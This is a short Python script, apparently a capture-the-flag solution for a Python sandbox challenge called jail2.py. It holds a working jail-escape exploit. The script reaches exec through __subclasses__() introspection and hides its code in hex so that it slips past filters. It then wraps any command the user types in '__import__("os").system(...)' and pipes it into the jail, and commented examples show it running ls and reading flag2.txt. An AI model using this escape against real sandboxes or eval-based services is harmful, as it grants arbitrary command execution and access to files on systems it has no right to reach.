#!/usr/bin/python3

import subprocess

# # Prints hola
# __builtins__.__class__.__base__.__subclasses__()[150]()._module.__builtins__[bytearray.fromhex("65786563").decode()](bytearray.fromhex("7072696e742822486f6c612229").decode())

# # Import os and run ls
# __builtins__.__class__.__base__.__subclasses__()[150]()._module.__builtins__[bytearray.fromhex("65786563").decode()](bytearray.fromhex("5f5f696d706f72745f5f28226f7322292e73797374656d28226c732229").decode())

# # import os and run cat on flag2
# __builtins__.__class__.__base__.__subclasses__()[150]()._module.__builtins__[bytearray.fromhex("65786563").decode()](bytearray.fromhex("5f5f696d706f72745f5f28226f7322292e73797374656d2822636174202e2f666c6167322e7478742229").decode())

payloadseg1="__builtins__.__class__.__base__.__subclasses__()[150]()._module.__builtins__[bytearray.fromhex('65786563').decode()](bytearray.fromhex('"
payloadseg2 = "').decode())"
importPayloadseg1 = "__import__(\"os\").system(\""
importPayloadseg2 = "\")"
while True:
    child = subprocess.Popen(['python3', 'jail2.py'], stdin=subprocess.PIPE)
    cmd=input().strip().replace("\n", "")
    encodedPayload= (importPayloadseg1 + cmd + importPayloadseg2).encode().hex()
    # print(encodedPayload)
    finalPayload = payloadseg1 + encodedPayload + payloadseg2
    # print("Final Payload", finalPayload, sep=": ")
    output, err = child.communicate(finalPayload.strip().encode())
    print(output)
